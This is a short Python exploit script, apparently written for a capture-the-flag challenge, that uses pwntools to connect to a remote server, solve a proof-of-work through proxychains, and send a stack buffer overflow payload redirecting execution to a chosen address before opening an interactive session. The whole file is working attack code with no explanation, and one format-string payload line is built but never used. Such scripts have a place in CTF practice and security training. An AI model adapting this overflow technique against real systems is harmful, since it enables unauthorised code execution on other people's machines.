import subprocess
from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./widget')

# p = process('./widget')
p = remote('challs.actf.co', '31320')
p.recvuntil(b'sh -s ')
arg = p.recvuntil(b'\n', drop=True)
r = subprocess.run(['proxychains', './pow', arg], stdout=subprocess.PIPE)
solution = r.stdout.decode().split('\n')[1]
p.sendlineafter('solution: ', solution.encode())

pause()

bss_addr = 0x404150
fmtstr_payload(8, {0x40402c: 0})
payload = b'a' * 0x20 + p64(bss_addr) + p64(0x40130b)
p.sendlineafter(b'Amount: ', str(len(payload)).encode())
p.sendafter(b'Contents: ', payload)

p.interactive()